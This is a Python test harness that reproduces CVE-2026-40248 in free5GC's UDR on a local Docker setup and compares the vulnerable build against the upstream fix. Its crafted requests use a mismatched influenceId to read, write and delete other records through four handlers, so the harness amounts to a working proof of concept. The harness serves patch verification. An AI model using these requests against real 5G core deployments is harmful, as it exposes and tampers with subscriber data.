"""free5GC full-deployment runtime validation harness: CVE-2026-40248,
all four reachable CRUD handlers (GET single, PUT single, DELETE single,
GET collection), against a real Docker deployment (real MongoDB, real
free5GC NRF) rather than the minimal stand-in used in
free5gc_runtime_case/. NO_PAID_BACKEND=1 is set defensively even though
this script never calls an LLM backend - the "patch" here is the real
upstream maintainers' own fix commit, checked out directly, not
generated.

Requires: Docker Desktop running, the free5gc-udr-custom:vulnerable and
:patched images already built (see udr_build/Dockerfile), and the
compose/ directory's docker-compose.yaml + docker-compose.override.yaml
(OAuth2 disabled on the NRF - see compose/config/nrfcfg.yaml - so this
class of bug, which is independent of authentication, can be exercised
directly; OAuth2 itself is explicitly out of scope for this harness).

Run: python free5gc_full_deployment/run_full_deployment_harness.py
"""
import json
import os
import subprocess
import time
from datetime import datetime, timezone
from pathlib import Path

os.environ["NO_PAID_BACKEND"] = "1"

import requests  # noqa: E402

HERE = Path(__file__).parent.resolve()
COMPOSE_DIR = HERE / "compose"
BASE_URL = "http://127.0.0.1:8080/nudr-dr/v2"
FIX_COMMIT = "86686276a7e226183ee786e3dd6714ec56c78fda"
VULN_COMMIT = f"{FIX_COMMIT}^"

CORRECT_INFLUENCE_ID = "subs-to-notify"
WRONG_INFLUENCE_ID = "attacker-controlled-id"
SEED_SUB_ID = "leak-test-sub-001"
INJECT_SUB_ID = "leak-test-sub-002"


def compose(*args, env=None):
    full_env = {**os.environ, **(env or {})}
    return subprocess.run(
        ["docker", "compose", *args], cwd=COMPOSE_DIR,
        capture_output=True, text=True, env=full_env, check=True,
    )


def wait_for_udr(retries=30, delay=1.0):
    for _ in range(retries):
        try:
            requests.get(f"{BASE_URL}/application-data/influenceData/subs-to-notify", timeout=3)
            return True
        except requests.exceptions.ConnectionError:
            time.sleep(delay)
    return False


def seed(sub_id=SEED_SUB_ID, dnn="internet"):
    return requests.put(
        f"{BASE_URL}/application-data/influenceData/{CORRECT_INFLUENCE_ID}/{sub_id}",
        json={"dnns": [dnn], "notificationUri": "http://127.0.0.1:9/callback"}, timeout=5,
    )


def raw(resp):
    return {"status_code": resp.status_code, "headers": dict(resp.headers), "body": resp.text}


def run_case(label: str) -> dict:
    """Runs the full four-handler test sequence against whichever UDR image is currently up."""
    result = {"label": label}

    seed_r = seed(SEED_SUB_ID)
    result["seed"] = raw(seed_r)

    # 1. Collection GET, empty query -> collection-wide leak candidate
    collection_r = requests.get(f"{BASE_URL}/application-data/influenceData/subs-to-notify", timeout=5)
    result["collection_get_empty_query"] = raw(collection_r)
    result["collection_get_leaked_data"] = (
        collection_r.status_code == 400 and len(collection_r.text) > len('{"status":400,"detail":"At least one of DNNs, S-NSSAIs, Internal Group IDs or SUPIs shall be provided"}')
    )

    # 2. Single GET, wrong influenceId -> single-record leak candidate
    get_r = requests.get(
        f"{BASE_URL}/application-data/influenceData/{WRONG_INFLUENCE_ID}/{SEED_SUB_ID}", timeout=5)
    result["single_get_wrong_influence_id"] = raw(get_r)
    result["single_get_leaked_data"] = (
        get_r.status_code == 404 and get_r.text != "404 page not found"
    )

    # 3. Single PUT, wrong influenceId -> unauthorized write candidate
    put_r = requests.put(
        f"{BASE_URL}/application-data/influenceData/{WRONG_INFLUENCE_ID}/{INJECT_SUB_ID}",
        json={"dnns": ["attacker-injected"], "notificationUri": "http://127.0.0.1:9/callback"}, timeout=5,
    )
    result["single_put_wrong_influence_id"] = raw(put_r)
    confirm_r = requests.get(
        f"{BASE_URL}/application-data/influenceData/{CORRECT_INFLUENCE_ID}/{INJECT_SUB_ID}", timeout=5)
    result["confirm_unauthorized_write"] = raw(confirm_r)
    result["single_put_unauthorized_write"] = (confirm_r.status_code == 200)

    # 4. Single DELETE, wrong influenceId -> already-known bug, re-confirmed for consistency
    del_seed_r = seed("leak-test-sub-003")
    result["delete_seed"] = raw(del_seed_r)
    del_r = requests.delete(
        f"{BASE_URL}/application-data/influenceData/{WRONG_INFLUENCE_ID}/leak-test-sub-003", timeout=5)
    result["single_delete_wrong_influence_id"] = raw(del_r)
    post_del_r = requests.get(
        f"{BASE_URL}/application-data/influenceData/{CORRECT_INFLUENCE_ID}/leak-test-sub-003", timeout=5)
    result["post_delete_check"] = raw(post_del_r)
    result["single_delete_confirmed_exploit"] = (post_del_r.status_code == 404)

    # 5. Benign path: legitimate GET with the correct influenceId still works
    benign_r = requests.get(
        f"{BASE_URL}/application-data/influenceData/{CORRECT_INFLUENCE_ID}/{SEED_SUB_ID}", timeout=5)
    result["benign_get_correct_influence_id"] = raw(benign_r)
    result["benign_path_preserved"] = (
        benign_r.status_code == 200 and benign_r.json().get("dnns") == ["internet"]
    )

    return result


def bring_up(image_tag: str):
    compose("stop", "free5gc-udr")
    compose("up", "-d", "free5gc-udr", env={"UDR_IMAGE_TAG": image_tag})
    if not wait_for_udr():
        raise RuntimeError(f"UDR ({image_tag}) never became reachable on :8080")


def save_container_log(label: str):
    proc = subprocess.run(["docker", "logs", "udr"], capture_output=True, text=True)
    (HERE / "evidence" / f"{label}_process.log").write_text(
        proc.stdout + proc.stderr, encoding="utf-8")


def main():
    (HERE / "evidence").mkdir(exist_ok=True)

    print("Bringing up db + real NRF (first run only; idempotent otherwise)...")
    compose("up", "-d", "db", "free5gc-nrf", env={"UDR_IMAGE_TAG": "vulnerable"})

    print("Vulnerable commit:", VULN_COMMIT)
    bring_up("vulnerable")
    vuln_result = run_case("vulnerable")
    save_container_log("vulnerable")

    print("Fixed commit:", FIX_COMMIT)
    bring_up("patched")
    patched_result = run_case("patched")
    save_container_log("patched")

    for label, r in (("vulnerable", vuln_result), ("patched", patched_result)):
        (HERE / "evidence" / f"{label}_response.json").write_text(
            json.dumps(r, indent=2), encoding="utf-8")

    manifest = {
        "cve_id": "CVE-2026-40248",
        "component": "free5GC UDR (internal/sbi/api_datarepository.go)",
        "handlers_tested": [
            "HandleApplicationDataInfluenceDataSubsToNotifyGet (collection)",
            "HandleApplicationDataInfluenceDataSubsToNotifySubscriptionIdGet",
            "HandleApplicationDataInfluenceDataSubsToNotifySubscriptionIdPut",
            "HandleApplicationDataInfluenceDataSubsToNotifySubscriptionIdDelete",
        ],
        "vulnerable_commit": VULN_COMMIT,
        "fixed_commit": FIX_COMMIT,
        "deployment": {
            "mongodb": "real, official mongo:4.4 image via free5gc-compose",
            "nrf": "real, official free5gc/nrf:v4.2.3 image (OAuth2 disabled in config - out of scope for this harness, see nrfcfg.yaml)",
            "udr": "custom-built from pinned commit, see udr_build/Dockerfile",
        },
        "generated_at": datetime.now(timezone.utc).isoformat(),
        "vulnerable_run": vuln_result,
        "patched_run": patched_result,
    }
    (HERE / "evidence" / "manifest.json").write_text(json.dumps(manifest, indent=2), encoding="utf-8")

    verdict = {
        "cve_id": "CVE-2026-40248",
        "collection_get_leak_confirmed_vulnerable": vuln_result["collection_get_leaked_data"],
        "collection_get_leak_fixed": not patched_result["collection_get_leaked_data"],
        "single_get_leak_confirmed_vulnerable": vuln_result["single_get_leaked_data"],
        "single_get_leak_fixed": not patched_result["single_get_leaked_data"],
        "single_put_unauthorized_write_confirmed_vulnerable": vuln_result["single_put_unauthorized_write"],
        "single_put_unauthorized_write_fixed": not patched_result["single_put_unauthorized_write"],
        "single_delete_confirmed_exploit_vulnerable": vuln_result["single_delete_confirmed_exploit"],
        "single_delete_fixed": not patched_result["single_delete_confirmed_exploit"],
        "benign_path_preserved_vulnerable": vuln_result["benign_path_preserved"],
        "benign_path_preserved_patched": patched_result["benign_path_preserved"],
    }
    all_confirmed = (
        verdict["collection_get_leak_confirmed_vulnerable"]
        and verdict["collection_get_leak_fixed"]
        and verdict["single_get_leak_confirmed_vulnerable"]
        and verdict["single_get_leak_fixed"]
        and verdict["single_put_unauthorized_write_confirmed_vulnerable"]
        and verdict["single_put_unauthorized_write_fixed"]
        and verdict["single_delete_confirmed_exploit_vulnerable"]
        and verdict["single_delete_fixed"]
        and verdict["benign_path_preserved_vulnerable"]
        and verdict["benign_path_preserved_patched"]
    )
    verdict["overall_verdict"] = "confirmed_fix_all_four_handlers" if all_confirmed else "partial_or_inconclusive"
    (HERE / "evidence" / "verdict.json").write_text(json.dumps(verdict, indent=2), encoding="utf-8")

    print(json.dumps(verdict, indent=2))


if __name__ == "__main__":
    main()
